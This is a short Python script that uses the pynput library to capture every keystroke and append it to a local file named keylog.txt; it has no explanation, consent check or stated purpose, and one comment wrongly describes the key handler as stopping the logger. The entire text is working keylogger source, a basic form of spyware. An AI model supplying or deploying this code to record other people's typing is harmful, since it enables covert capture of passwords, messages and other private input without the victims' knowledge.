from pynput.keyboard import Listener

# Path to save the log file
log_file = "keylog.txt"

# Function to log the key pressed
def log_keystroke(key):
    key = str(key).replace("'", "")
    with open(log_file, 'a') as f:
        f.write(f"{key}\n")

# Function to stop the logger
def on_press(key):
    try:
        log_keystroke(key)
    except Exception as e:
        print(f"Error: {e}")

# Listener to detect key presses
with Listener(on_press=on_press) as listener:
    listener.join()
